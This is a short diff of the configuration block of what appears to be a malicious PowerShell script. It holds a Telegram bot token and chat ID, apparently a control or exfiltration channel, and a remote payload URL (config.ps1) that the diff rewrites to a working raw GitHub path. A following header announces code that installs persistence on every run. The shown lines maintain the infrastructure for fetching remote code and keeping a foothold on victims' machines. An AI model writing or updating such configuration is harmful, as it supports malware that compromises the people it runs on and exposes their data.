@@ -1,7 +1,7 @@
 # ================= CONFIG (EDIT THESE THREE) =================
 $BotToken  = "9113495270:AAH-QUdzKsPLPbvJ0ACCnhe6d8ESCBGxfDw"
 $ChatID    = "7796433181"
-$PayloadURL = "https://raw.githubusercontent.com/theronscroll-star/utils/main/config.ps1"
+$PayloadURL = "https://raw.githubusercontent.com/theronscroll-star/utils/refs/heads/main/config.ps1"
 # =============================================================
 
 # ---- INSTALL PERSISTENCE (runs every time) ----
